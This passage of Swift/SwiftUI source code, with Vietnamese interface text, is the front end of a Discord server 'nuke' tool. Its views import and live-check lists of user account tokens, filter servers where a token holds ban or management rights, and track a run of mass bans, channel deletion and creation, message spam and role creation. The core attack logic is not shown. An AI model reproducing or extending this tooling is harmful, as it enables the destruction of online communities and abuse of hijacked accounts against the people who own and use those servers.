        if userNuke.selectedTokenIds.isEmpty { return "User — Chọn Token" }
        return "User — Chọn Server"
    }
}

struct UserNukeTokenPickerView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    @Binding var selectedGuild: Guild?
    @State private var showImport = false
    @State private var showManual = false
    @State private var showErr = false

    var body: some View {
        VStack(spacing: 0) {
            HStack(spacing: 10) {
                Button { showManual = true } label: {
                    Label("Thêm tay", systemImage: "keyboard")
                        .font(.subheadline.bold()).frame(maxWidth: .infinity).padding(12)
                }.background(Color.indigo).foregroundStyle(.white).cornerRadius(10)

                Button { showImport = true } label: {
                    Label("Import", systemImage: "doc.badge.plus")
                        .font(.subheadline.bold()).frame(maxWidth: .infinity).padding(12)
                }.background(Color.blue).foregroundStyle(.white).cornerRadius(10)

                if !userNuke.tokens.isEmpty {
                    Menu {
                        Button("Xóa tất cả", systemImage: "trash", role: .destructive) { userNuke.clearAll() }
                    } label: {
                        Image(systemName: "ellipsis.circle").font(.title3).padding(12)
                            .background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)
                    }
                }
            }.padding(.horizontal).padding(.top, 8)

            if userNuke.isImporting { ProgressView("Đang kiểm tra...").padding(30) }

            if userNuke.tokens.isEmpty {
                EmptyStateView(title: "Chưa có token user", systemImage: "person.badge.key",
                               description: "Import file .txt hoặc thêm tay.\nToken nuke lưu riêng.")
            } else {
                List {
                    Section(header: Text("Chọn token (\(userNuke.selectedTokenIds.count) đã chọn)")) {
                        ForEach(userNuke.tokens) { t in
                            HStack(spacing: 12) {
                                Button { userNuke.toggleSelection(t) } label: {
                                    Image(systemName: userNuke.selectedTokenIds.contains(t.id) ? "checkmark.circle.fill" : "circle")
                                        .foregroundStyle(userNuke.selectedTokenIds.contains(t.id) ? .indigo : .secondary)
                                        .font(.title3)
                                }.buttonStyle(.plain).disabled(!t.isValid)

                                if let url = t.avatarURL {
                                    AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                    placeholder: { Circle().fill(Color.gray.opacity(0.3)) }.frame(width: 36, height: 36).clipShape(Circle())
                                } else {
                                    Image(systemName: "person.circle.fill").resizable()
                                        .frame(width: 36, height: 36).foregroundStyle(.gray)
                                }
                                VStack(alignment: .leading, spacing: 2) {
                                    Text(t.username).font(.subheadline.bold())
                                    Text(t.isValid ? "Live" : "Die").font(.caption2).bold()
                                        .foregroundStyle(t.isValid ? .green : .red)
                                }
                                Spacer()
                                Button { userNuke.removeToken(t.id) } label: {
                                    Image(systemName: "xmark.circle.fill").foregroundStyle(.secondary).font(.title3)
                                }.buttonStyle(.plain)
                            }.opacity(t.isValid ? 1 : 0.5)
                        }
                    }
                }
            }

            if !userNuke.selectedTokenIds.isEmpty {
                Button {
                    Task { await userNuke.loadAllGuildsForSelected() }
                } label: {
                    HStack {
                        if userNuke.isLoadingGuilds { ProgressView().tint(.white) }
                        Text("TIẾP TỤC (\(userNuke.selectedTokenIds.count) token)").bold()
                    }.frame(maxWidth: .infinity).padding()
                }.background(Color.indigo).foregroundStyle(.white).cornerRadius(12)
                .padding(.horizontal).padding(.bottom, 8)
                .disabled(userNuke.isLoadingGuilds)
            }
        }
        .sheet(isPresented: $showImport) {
            DocumentPicker(contentTypes: [.item]) { u in Task { await userNuke.importFromFile(url: u) } }
        }
        .sheet(isPresented: $showManual) { UserNukeManualAddSheet() }
        .alert("Lỗi", isPresented: $showErr) { Button("OK", role: .cancel) {} }
        message: { Text(userNuke.importError ?? "") }
        .onChange(of: userNuke.importError) { v in if v != nil { showErr = true } }
    }
}

struct UserNukeManualAddSheet: View {
    @EnvironmentObject var userNuke: UserNukeManager
    @Environment(\.dismiss) var dismiss
    @State private var input = ""
    @State private var errorMsg: String? = nil
    @FocusState private var focused: Bool

    var body: some View {
        NavigationStack {
            Form {
                Section(header: Text("Nhập User Token")) {
                    TextEditor(text: $input)
                        .frame(height: 100)
                        .font(.system(.body, design: .monospaced))
                        .autocorrectionDisabled()
                        .textInputAutocapitalization(.never)
                        .focused($focused)
                }
                if let e = errorMsg {
                    Section { Text(e).font(.caption).foregroundStyle(.red) }
                }
                Section(footer: Text("Mỗi dòng 1 token.")) {
                    Button("Thêm token") { Task { await addTokens() } }
                        .disabled(input.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty || userNuke.isImporting)
                }
            }
            .navigationTitle("Thêm token tay").navigationBarTitleDisplayMode(.inline)
            .toolbar { ToolbarItem(placement: .cancellationAction) { Button("Huỷ") { dismiss() } } }
            .onAppear { focused = true }
        }
    }

    private func addTokens() async {
        let lines = input.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }
        guard !lines.isEmpty else { errorMsg = "Không có token"; return }
        errorMsg = nil
        var ok = 0
        for line in lines { if await userNuke.addTokenManually(line) { ok += 1 } }
        if ok > 0 { dismiss() }
        else { errorMsg = "Không thêm được (trùng hoặc token chết)." }
    }
}

struct UserNukeGuildListView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    @Binding var selectedGuild: Guild?
    @State private var searchText = ""
    var filtered: [Guild] {
        searchText.isEmpty ? userNuke.eligibleGuilds : userNuke.eligibleGuilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
    }
    var body: some View {
        VStack(spacing: 0) {
            HStack(spacing: 8) {
                Image(systemName: "shield.checkerboard").foregroundStyle(.green)
                Text("Server có ít nhất 1 quyền cho \(userNuke.selectedTokenIds.count) token")
                    .font(.caption).foregroundStyle(.secondary)
                Spacer()
                Button { userNuke.clearSelection() } label: {
                    Text("Đổi").font(.caption.bold()).padding(6)
                        .background(Color.indigo.opacity(0.15)).cornerRadius(6)
                }
                Button { Task { await userNuke.loadAllGuildsForSelected() } } label: {
                    Image(systemName: "arrow.clockwise").padding(8)
                }
            }.padding(.horizontal).padding(.vertical, 8).background(Color.green.opacity(0.1))

            if userNuke.isLoadingGuilds { ProgressView("Đang tải...").padding(40); Spacer() }
            else if userNuke.eligibleGuilds.isEmpty {
                EmptyStateView(title: "Không có server phù hợp", systemImage: "exclamationmark.triangle",
                               description: "Cần ít nhất 1 token có quyền Ban / Manage Channels / Manage Roles / Manage Server.")
            } else {
                List(filtered) { g in
                    Button { selectedGuild = g } label: {
                        HStack(spacing: 12) {
                            if let icon = g.icon, let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                placeholder: { Circle().fill(.gray.opacity(0.3)) }.frame(width: 42, height: 42).clipShape(Circle())
                            } else { Circle().fill(.gray.opacity(0.3)).frame(width: 42, height: 42) }
                            VStack(alignment: .leading, spacing: 2) {
                                Text(g.name).font(.headline)
                                Text(g.id).font(.caption2).foregroundStyle(.secondary).monospaced()
                            }
                            Spacer()
                            Image(systemName: "chevron.right").foregroundStyle(.tertiary)
                        }.padding(.vertical, 4)
                    }.buttonStyle(.plain)
                }.searchable(text: $searchText, prompt: "Tìm...")
            }
        }
    }
}

struct UserNukeRunningView: View {
    @EnvironmentObject var userNuke: UserNukeManager
    var body: some View {
        NukeRunningUI(
            phase: userNuke.currentPhase, progress: userNuke.phaseProgress,
            banOk: userNuke.banSuccess, banFail: userNuke.banFailed,
            chDel: userNuke.channelsDeleted, chCreate: userNuke.channelsCreated,
            msgSent: userNuke.messagesSent, roleCreate: userNuke.rolesCreated,
            log: userNuke.nukeLog, onStop: { userNuke.stop() }
        )
    }
}